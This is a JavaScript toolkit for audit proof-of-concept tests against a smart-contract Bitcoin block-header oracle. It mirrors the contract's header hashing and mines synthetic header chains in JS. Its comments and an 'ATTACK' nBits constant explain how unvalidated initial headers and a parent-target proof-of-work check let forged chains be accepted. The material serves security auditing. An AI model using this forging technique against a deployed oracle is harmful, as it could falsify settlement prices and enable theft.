// Bitcoin block-header toolkit for the oracle security PoCs (`test/audit/ORC-*.test.js`).
//
// Two jobs:
//   1. Reproduce `BlockHeaderUtils` exactly (80-byte serialisation, double-SHA256,
//      byte order, nBits → target decoding) so the tests can predict what the
//      contract will compute and assert against it.
//   2. Build *synthetic* header chains that the oracle will accept: linked headers
//      with chosen timestamps / nBits, each with a nonce mined in JS.
//
// Why synthetic chains work against the current oracle:
//   - `initializeBlockHeaderOracle` does not validate its 17 headers (ORC-008), so the
//     buffer can be seeded with an easy, regtest-style target;
//   - PoW is checked against the PREVIOUS header's nBits (ORC-001), so every follow-on
//     header only has to beat that easy target (~2 tries at 0x207fffff).
//
// The default chains are consensus-valid under Bitcoin's *regtest* rules: linked,
// constant nBits (no retarget inside the chain), hash <= its own target AND < the
// parent's target, timestamps strictly above the 11-block median and never ahead of
// the EVM clock. That keeps them usable as CONTROL inputs after the oracle is fixed —
// unless the fix enforces Bitcoin MAINNET's powLimit, which no CPU-mined header can meet.
//
// Byte order (mirrors BlockHeaderUtils.calculateBlockHash):
//   - integer fields (version, timestamp, nBits, nonce) are little-endian;
//   - prevBlockHash / merkleRootHash are stored in "display" order (block-explorer
//     order, big-endian) and reversed into internal order for serialisation;
//   - the double-SHA256 digest is reversed back to display order, and that value
//     compared as a big-endian uint256 against the target.

const crypto = require("crypto");

const NUM_OF_BLOCK_HEADERS = 17; // LibDoefinStorage.NUM_OF_BLOCK_HEADERS
const MEDIAN_WINDOW = 11; // LibDoefinStorage.NUM_OF_TIMESTAMPS
const SETTLEMENT_DELAY = 6; // LibDoefinStorage.SETTLEMENT_DELAY
const TIMESTAMP_BUCKET = 600; // LibDoefinStorage.TIMESTAMP_BUCKET
const EPOCH_LENGTH = 2016; // Bitcoin retarget interval
const TARGET_SPACING = 600; // Bitcoin target block interval (s)

const UINT256_MASK = (1n << 256n) - 1n;
const BASE_DIFFICULTY_TARGET = 0xffffn << 208n; // BlockHeaderUtils.BASE_DIFFICULTY_TARGET

const NBITS = {
  // Bitcoin regtest powLimit encoding: target ≈ 2^255, a random hash passes with p ≈ 1/2.
  REGTEST: 0x207fffff,
  // Half the regtest target (2x harder). Used where a header must DECLARE a harder target
  // than its parent while staying inside the 4x retarget clamp.
  REGTEST_HALF: 0x203fffff,
  // target = 0xffff · 2^224: p ≈ 2^-16 per try (~65k hashes in JS).
  EASY_16: 0x1f00ffff,
  // The review's attack encoding: target = 0xffff · 2^240 ≈ 2^256 · (1 − 2^-16).
  // Any hash passes with p ≈ 1 − 2^-16; integer difficulty = 0.
  ATTACK: 0x2100ffff,
  // Bitcoin mainnet powLimit (difficulty 1).
  MAINNET_POW_LIMIT: 0x1d00ffff,
};

const POW_LIMIT = {
  MAINNET: 0x00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffn,
  REGTEST: 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn,
};

// ------------------------------------------------------------------------------------
// Hashing / serialisation
// ------------------------------------------------------------------------------------

function sha256(buf) {
  return crypto.createHash("sha256").update(buf).digest();
}

function sha256d(buf) {
  return sha256(sha256(buf));
}

function strip0x(hex) {
  return hex.startsWith("0x") || hex.startsWith("0X") ? hex.slice(2) : hex;
}

function bytes32(hex) {
  const h = strip0x(hex);
  if (!/^[0-9a-fA-F]{64}$/.test(h)) throw new Error(`not a bytes32 hex string: ${hex}`);
  return Buffer.from(h, "hex");
}

/** 80-byte Bitcoin wire serialisation of a header in contract field shape. */
function serializeHeader(h) {
  const buf = Buffer.alloc(80);
  buf.writeUInt32LE(h.version >>> 0, 0);
  bytes32(h.prevBlockHash).reverse().copy(buf, 4);
  bytes32(h.merkleRootHash).reverse().copy(buf, 36);
  buf.writeUInt32LE(h.timestamp >>> 0, 68);
  buf.writeUInt32LE(h.nBits >>> 0, 72);
  buf.writeUInt32LE(h.nonce >>> 0, 76);
  return buf;
}

function digestToDisplayHex(digest) {
  return "0x" + Buffer.from(digest).reverse().toString("hex");
}

/** Block hash exactly as `BlockHeaderUtils.calculateBlockHash` returns it (display order). */
function blockHash(h) {
  return digestToDisplayHex(sha256d(serializeHeader(h)));
}

/** Parse a raw 80-byte header (hex, as served by mempool.space) into contract field shape. */
function parseRawHeader(rawHex, blockNumber) {
  const buf = Buffer.from(strip0x(rawHex), "hex");
  if (buf.length !== 80) throw new Error(`raw header must be 80 bytes, got ${buf.length}`);
  return {
    prevBlockHash: "0x" + Buffer.from(buf.subarray(4, 36)).reverse().toString("hex"),
    merkleRootHash: "0x" + Buffer.from(buf.subarray(36, 68)).reverse().toString("hex"),
    blockHash: digestToDisplayHex(sha256d(buf)),
    blockNumber,
    version: buf.readUInt32LE(0),
    timestamp: buf.readUInt32LE(68),
    nBits: buf.readUInt32LE(72),
    nonce: buf.readUInt32LE(76),
  };
}

function hashToBigInt(hashHex) {
  return BigInt("0x" + strip0x(hashHex));
}

// ------------------------------------------------------------------------------------
// Targets, difficulty, work
// ------------------------------------------------------------------------------------

/**
 * Mirror of `BlockHeaderUtils.calculateDifficultyTarget` — including its defects:
 * no sign-bit handling, and the left shift silently truncates mod 2^256 (a shift of
 * 256 bits or more yields 0, as in the EVM).
 */
function contractTarget(nBits) {
  const exponent = BigInt(nBits >>> 24);
  const coefficient = BigInt(nBits & 0xffffff);
  if (exponent <= 3n) return coefficient >> (8n * (3n - exponent));
  const shift = 8n * (exponent - 3n);
  if (shift >= 256n) return 0n;
  return (coefficient << shift) & UINT256_MASK;
}

/**
 * Bitcoin Core's `arith_uint256::SetCompact` plus the `DeriveTarget` validity rule
 * (pow.cpp): a target is valid only if it is not negative, does not overflow, is
 * non-zero and is at or below powLimit.
 */
function bitcoinDecodeCompact(nBits, powLimit = POW_LIMIT.MAINNET) {
  const size = nBits >>> 24;
  const word = nBits & 0x007fffff;
  let target;
  if (size <= 3) target = BigInt(word) >> BigInt(8 * (3 - size));
  else target = BigInt(word) << BigInt(8 * (size - 3)); // unbounded: Bitcoin flags overflow instead
  const negative = word !== 0 && (nBits & 0x00800000) !== 0;
  const overflow = word !== 0 && (size > 34 || (word > 0xff && size > 33) || (word > 0xffff && size > 32));
  const valid = !negative && !overflow && target !== 0n && target <= powLimit;
  return { target, negative, overflow, valid };
}

/** Mirror of `BlockHeaderUtils.calculateDifficulty` (throws where the contract reverts). */
function contractDifficulty(nBits) {
  const target = contractTarget(nBits);
  if (target === 0n) throw new Error("BlockHeaderOracle_InvalidTargetNBits");
  return BASE_DIFFICULTY_TARGET / target;
}

/** Bitcoin's GetBlockProof: expected hashes to find a block at `nBits` (own target). */
function blockWork(nBits) {
  const target = contractTarget(nBits);
  return (UINT256_MASK - target) / (target + 1n) + 1n;
}

/** Oracle PoW rule today: `uint256(hash) < target(parent.nBits)` (BlockHeaderUtils.isValidBlockHeaderHash). */
function passesOracleCheck(parent, child) {
  return hashToBigInt(child.blockHash) < contractTarget(parent.nBits);
}

/** Bitcoin's PoW rule: `hash <= target(own nBits)`, own nBits a valid compact target. */
function passesBitcoinPow(header, powLimit = POW_LIMIT.MAINNET) {
  const d = bitcoinDecodeCompact(header.nBits, powLimit);
  return d.valid && hashToBigInt(header.blockHash) <= d.target;
}

// ------------------------------------------------------------------------------------
// Mining
// ------------------------------------------------------------------------------------

/**
 * Search nonces until `accept(hashBigInt)` holds. Returns the completed header and
 * the number of tries. Deterministic for fixed inputs (nonce search starts at 0).
 */
function mine(fields, accept, { startNonce = 0, maxTries = 50_000_000 } = {}) {
  const buf = serializeHeader({ ...fields, nonce: 0 });
  for (let i = 0; i < maxTries; i++) {
    const nonce = (startNonce + i) >>> 0;
    buf.writeUInt32LE(nonce, 76);
    const hashHex = digestToDisplayHex(sha256d(buf));
    if (accept(hashToBigInt(hashHex))) {
      return { header: { ...fields, nonce, blockHash: hashHex }, tries: i + 1 };
    }
  }
  throw new Error(`no nonce found within ${maxTries} tries`);
}

/** Mine so that hash < target (strict, so it satisfies both the oracle's `<` and Bitcoin's `<=`). */
function mineBelow(fields, target, opts) {
  return mine(fields, (h) => h < target, opts);
}

/** Deterministic, branch-specific merkle root (the oracle never checks it). */
function merkleFor(tag, height) {
  return "0x" + sha256(Buffer.from(`${tag}:${height}`)).toString("hex");
}

/**
 * Build one header on top of `parent`.
 *   opts.timestamp   explicit timestamp (default parent.timestamp + TARGET_SPACING)
 *   opts.nBits       declared nBits (default parent.nBits)
 *   opts.tag         merkle-root tag (distinguishes sibling branches)
 *   opts.version     default 0x20000000
 *   opts.accept      custom acceptance predicate on the hash (overrides the default)
 * Default acceptance = honest header: hash < min(target(parent.nBits), target(own nBits)).
 */
function nextHeader(parent, opts = {}) {
  const blockNumber = Number(parent.blockNumber) + 1;
  const nBits = opts.nBits ?? parent.nBits;
  const tag = opts.tag ?? "synthetic";
  const fields = {
    prevBlockHash: parent.blockHash,
    merkleRootHash: opts.merkleRootHash ?? merkleFor(tag, blockNumber),
    blockNumber,
    version: opts.version ?? 0x20000000,
    timestamp: opts.timestamp ?? Number(parent.timestamp) + TARGET_SPACING,
    nBits,
  };
  if (opts.accept) return mine(fields, opts.accept, opts).header;
  const parentTarget = contractTarget(parent.nBits);
  const ownTarget = contractTarget(nBits);
  const target = parentTarget < ownTarget ? parentTarget : ownTarget;
  return mineBelow(fields, target, opts).header;
}

/**
 * Extend `parent` by `count` headers. `opts.timestampAt(i, prev)` (1-based i) may
 * override individual timestamps; `opts.nBitsAt(i, prev)` likewise for nBits.
 */
function extendChain(parent, count, opts = {}) {
  const out = [];
  let prev = parent;
  for (let i = 1; i <= count; i++) {
    const timestamp = opts.timestampAt ? opts.timestampAt(i, prev) : Number(prev.timestamp) + (opts.spacing ?? TARGET_SPACING);
    const nBits = opts.nBitsAt ? opts.nBitsAt(i, prev) : opts.nBits ?? prev.nBits;
    const h = nextHeader(prev, { ...opts, timestamp, nBits });
    out.push(h);
    prev = h;
  }
  return out;
}

/**
 * 17 linked headers for `initializeBlockHeaderOracle`, heights
 * startHeight .. startHeight+16, timestamps startTimestamp + i·spacing, all at `nBits`,
 * each mined against its own target. The first header's parent hash is arbitrary.
 */
function makeInitBuffer({ startHeight, startTimestamp, nBits = NBITS.REGTEST, spacing = TARGET_SPACING, tag = "init" }) {
  const pseudoParent = {
    blockHash: "0x" + sha256(Buffer.from(`${tag}:parent-of-${startHeight}`)).toString("hex"),
    blockNumber: startHeight - 1,
    timestamp: startTimestamp - spacing,
    nBits,
  };
  return extendChain(pseudoParent, NUM_OF_BLOCK_HEADERS, { nBits, spacing, tag });
}

// ------------------------------------------------------------------------------------
// Time helpers
// ------------------------------------------------------------------------------------

/** Bitcoin median-time-past of up to 11 timestamps (order irrelevant). */
function medianOf(timestamps) {
  if (timestamps.length !== MEDIAN_WINDOW) throw new Error(`median window must be ${MEDIAN_WINDOW} timestamps`);
  const s = timestamps.map(Number).sort((a, b) => a - b);
  return s[5];
}

/** MTP a new child of `chain[chain.length-1]` must beat, from an honest linear chain. */
function honestMtp(chain) {
  return medianOf(chain.slice(-MEDIAN_WINDOW).map((h) => h.timestamp));
}

function timestampBucket(ts) {
  return Math.floor(Number(ts) / TIMESTAMP_BUCKET) * TIMESTAMP_BUCKET;
}

function epochOf(height) {
  return Math.floor(Number(height) / EPOCH_LENGTH);
}

/** Strip a header to the struct the contract ABI expects (drops helper-only fields). */
function toContract(h) {
  return {
    prevBlockHash: h.prevBlockHash,
    merkleRootHash: h.merkleRootHash,
    blockHash: h.blockHash,
    blockNumber: h.blockNumber,
    version: h.version,
    timestamp: h.timestamp,
    nBits: h.nBits,
    nonce: h.nonce,
  };
}

module.exports = {
  NUM_OF_BLOCK_HEADERS,
  MEDIAN_WINDOW,
  SETTLEMENT_DELAY,
  TIMESTAMP_BUCKET,
  EPOCH_LENGTH,
  TARGET_SPACING,
  BASE_DIFFICULTY_TARGET,
  NBITS,
  POW_LIMIT,
  sha256,
  sha256d,
  serializeHeader,
  blockHash,
  parseRawHeader,
  hashToBigInt,
  contractTarget,
  bitcoinDecodeCompact,
  contractDifficulty,
  blockWork,
  passesOracleCheck,
  passesBitcoinPow,
  mine,
  mineBelow,
  merkleFor,
  nextHeader,
  extendChain,
  makeInitBuffer,
  medianOf,
  honestMtp,
  timestampBucket,
  epochOf,
  toContract,
};
